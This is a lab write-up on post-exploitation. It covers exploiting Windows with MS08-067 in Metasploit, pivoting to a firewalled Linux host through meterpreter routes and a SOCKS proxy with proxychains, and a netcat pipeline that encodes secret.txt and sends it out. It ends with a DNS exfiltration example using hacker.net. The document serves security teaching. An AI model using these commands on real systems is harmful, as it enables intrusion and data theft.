# Pivoting, Proxying and Data Exfiltration in the Lab

## 0. Goal

The idea is:

1. First, exploit the **Windows box** with Metasploit (MS08-067).
2. Then use that compromised Windows machine as a **pivot / proxy** to attack the Linux machine.
3. At the same time, simulate a **firewall on Linux** so that Kali cannot attack it directly.
4. Finally, use **proxychains + Metasploit SOCKS proxy** and then show a small **data exfiltration** example.

So in the end, Kali never talks to Linux directly, it always goes "through" Windows or through a tunnel.

---

## 1. Gaining the First Foothold (Windows MS08-067)

I start by exploiting the Windows machine from Kali using the classic MS08-067 NetAPI exploit.

In `msfconsole`:

```msf
msf > use exploit/windows/smb/ms08_067_netapi 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.0.1
LHOST => 192.168.0.1

msf exploit(windows/smb/ms08_067_netapi) > set RHOSTS 192.168.0.100
RHOSTS => 192.168.0.100

msf exploit(windows/smb/ms08_067_netapi) > exploit
```

If the target is vulnerable, I get a `meterpreter` session back from `192.168.0.100`. I can confirm with:

```msf
msf > sessions -l
```

Now Windows is under my control and will become my **jump box** into the rest of the network.

---

## 2. Simulating a Firewall Blocking Kali from Linux

I want to force myself to **pivot through Windows**, so I simulate a firewall on the Linux machine that only allows traffic from Windows (`192.168.0.100`) and drops traffic from Kali.

On the **Linux machine** (as root):

```bash
# Allow Windows to talk to Linux
sudo iptables -A INPUT -s 192.168.0.100 -j ACCEPT

# Drop everything else by default
sudo iptables -P INPUT DROP

# Check rules
sudo iptables -L -n
```

Now, if I try to scan Linux directly from Kali:

```bash
nmap -p 21 -sS 192.168.0.101
```

…it should either hang or show ports as filtered, because Kali’s traffic is being dropped by the Linux firewall.

However, **Windows to Linux** traffic is still allowed. That’s what we’ll abuse.

---

## 3. Pivoting with Metasploit: Route Through the Windows Meterpreter Session

First, background that session:

```msf
meterpreter > background
[*] Backgrounding session 3
```

Check sessions:

```msf
msf > sessions -l
```

You should see something like:

```text
  Id  Name  Type                Information
  --  ----  ----                -----------
  3         meterpreter x86/win NT AUTHORITY\SYSTEM ...
```

Now tell Metasploit to **route traffic destined for 192.168.0.101 through session 3**:

```msf
msf > route add 192.168.0.101 255.255.255.255 3
```

* `192.168.0.101` – target Linux IP
* `255.255.255.255` – single host
* `3` – ID of the Meterpreter session on Windows (this is our "gateway").

We can list routes to check:

```msf
msf > route print
```

We should now have a route entry where the **next hop** is session `3`.

---

## 4. Scanning Linux from Kali via the Windows Pivot

Now that the route is in place, any Metasploit module that tries to reach `192.168.0.101` will send its traffic through the Windows session instead of directly from Kali.

### 4.1 Using Metasploit’s TCP port scanner

From `msfconsole`:

```msf
msf > use auxiliary/scanner/portscan/tcp
msf auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.0.101
msf auxiliary(scanner/portscan/tcp) > set PORTS 21,22,80
msf auxiliary(scanner/portscan/tcp) > run
```

Now, even though Kali is personally blocked by the Linux firewall, the scan should work because:

* The TCP connections come from the Windows host (which Linux allows).
* Metasploit transparently tunnels that traffic via the Meterpreter session.

Example output:

```text
[+] 192.168.0.101 - 192.168.0.101:21 - TCP OPEN
[+] 192.168.0.101 - 192.168.0.101:22 - TCP OPEN
[+] 192.168.0.101 - 192.168.0.101:80 - TCP OPEN
[*] 192.168.0.101 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

This is a classic **pivot**: we’re abusing one compromised machine (Windows) to reach another (Linux) behind a firewall.

---

## 5. Using Proxychains + Metasploit SOCKS Proxy

Using Metasploit’s built-in routing is great for modules inside Metasploit. But what if I want to use **normal tools** like `nmap`, `curl`, `ssh`, etc. through that pivot?

We can do that by combining:

* Metasploit’s **SOCKS proxy** (`auxiliary/server/socks_proxy`)
* Linux **proxychains** (make OS tools use a SOCKS proxy)

### 5.1 Configure proxychains

On **Kali**, edit `/etc/proxychains4.conf`:

```bash
sudo nano /etc/proxychains4.conf
```

Go to the bottom and configure a local SOCKS v4 proxy, e.g.:

```text
# default Tor config (we comment it out)
#socks4         127.0.0.1 9050

# our Metasploit SOCKS proxy
socks4          127.0.0.1 1080
```

Save and exit.

This tells proxychains: "when you wrap a command with `proxychains`, send all its TCP traffic through a SOCKS4 proxy at `127.0.0.1:1080`."

### 5.2 Start the Metasploit SOCKS proxy

In `msfconsole`:

```msf
msf > use auxiliary/server/socks_proxy
msf auxiliary(server/socks_proxy) > set VERSION 4a
msf auxiliary(server/socks_proxy) > set SRVPORT 1080
msf auxiliary(server/socks_proxy) > exploit
```

Now Metasploit is listening on `127.0.0.1:1080` as a SOCKS proxy.
Behind the scenes, any connection it sees will be routed via the Meterpreter routes we set up (including the pivot through session 3).

### 5.3 Running tools through the proxy

Now on Kali, I can use any TCP tool through the pivot with:

```bash
proxychains nmap -sS -p 21 192.168.0.101
```

What happens:

* `nmap` thinks it’s scanning directly.
* `proxychains` intercepts its TCP connections and sends them to 127.0.0.1:1080.
* Metasploit’s SOCKS proxy then forwards them through the Windows Meterpreter session to the Linux target.

So I can now use things like:

```bash
proxychains ssh user@192.168.0.101
proxychains curl http://192.168.0.101/
```

All going through my **Windows pivot**, not directly from Kali.

---

## 6. Data Exfiltration Example (TCP)

Once you’re inside the network, you often want to smuggle data out (data exfiltration). The idea here is:

* Compress and encode a file on the Linux machine.
* Stream it over a simple TCP connection (netcat).
* Receive and decode it on Kali.

### 6.1 Listener on Kali (attacker)

On **Kali**, run netcat to listen and save whatever comes in:

```bash
nc -lvnp 12345 > ./exfiltration.data
```

* `-l` – listen mode
* `-v` – verbose
* `-n` – numeric IPs
* `-p 12345` – port number

Everything sent to `192.168.0.1:12345` will be written into `exfiltration.data`.

### 6.2 Exfil command on Linux (victim)

On the **Linux** machine, suppose we want to exfiltrate `secret.txt`.

We can create a pipeline:

```bash
tar zcf - secret.txt | base64 | dd conv=ebcdic | nc 192.168.0.1 12345
```

Explanation:

* `tar zcf - secret.txt`
  compresses `secret.txt` into a tar.gz archive and writes it to stdout (`-`).
* `| base64`
  encodes the binary tar.gz as base64 text.
* `| dd conv=ebcdic`
  applies a weird conversion (ASCII to EBCDIC) just to "obfuscate" the data slightly.
* `| nc 192.168.0.1 12345`
  sends the resulting stream to Kali’s netcat listener.

On Kali, `exfiltration.data` now contains this transformed data.

### 6.3 Decoding the exfiltrated data

Back on **Kali**:

```bash
strings exfiltration.data
```

You might see base64-like text, but it’s still EBCDIC-encoded. So we reverse the process:

```bash
dd conv=ascii if=./exfiltration.data | base64 -d | tar xzv
```

* `dd conv=ascii`
  converts EBCDIC back to ASCII.
* `| base64 -d`
  base64 decode back to tar.gz binary.
* `| tar xzv`
  extract the tar.gz archive.

At the end, `secret.txt` should appear in your current directory on Kali.

This is a simple example of:

* Wrapping data,
* Encoding/obfuscating it,
* Sending over a raw TCP channel,
* Reconstructing it on the other side.

---

## 7. Other Exfil / C2 Channels (ICMP & DNS idea)

In the lab we also briefly discussed that you don’t have to use TCP ports like 12345. You can get more creative:

* **ICMP exfiltration**:
  Use `ping` packets (ICMP echo) where the payload is custom data. The receiver reads the packet body.
  There are tools that do this automatically.

* **DNS exfiltration**:
  DNS queries often bypass many firewalls. You can encode data (e.g. base64) into subdomains like:

  ```text
  abcdefghijklmnop.hacker.net
  ```

  and have an authoritative DNS server for `hacker.net` that logs queries. Tools like `iodine` use DNS tunneling to carry IP traffic over DNS.

Example idea:

```bash
host ABCDEFGHIJKLMNOP.hacker.net
```

From the outside, it just looks like DNS traffic; but in reality, each query’s subdomain encodes a chunk of your secret data. On your DNS server, you reconstruct the message.

**exfiltration and command-and-control** can ride on almost any protocol the firewall allows (HTTP, HTTPS, DNS, ICMP, etc.).

---

## 8. Takeaways

* **Pivoting** is crucial in realistic environments: the first machine you pop is rarely the final target.
* Metasploit’s `route add` + `auxiliary/server/socks_proxy` + `proxychains` give you a very flexible way to tunnel arbitrary tools through compromised hosts.
* **Firewalls** that block direct traffic can often be bypassed using **internal pivot points**.
* **Data exfiltration** is not just "scp secret.txt". In practice, attackers compress and encode data, then smuggle it over approved channels (HTTPS, DNS, etc.).
* As defenders, we need to:

  * Watch for unusual internal connections (like workstation to workstation).
  * Monitor for strange DNS/ICMP patterns.
  * Segment networks so that one compromised host can’t see everything.
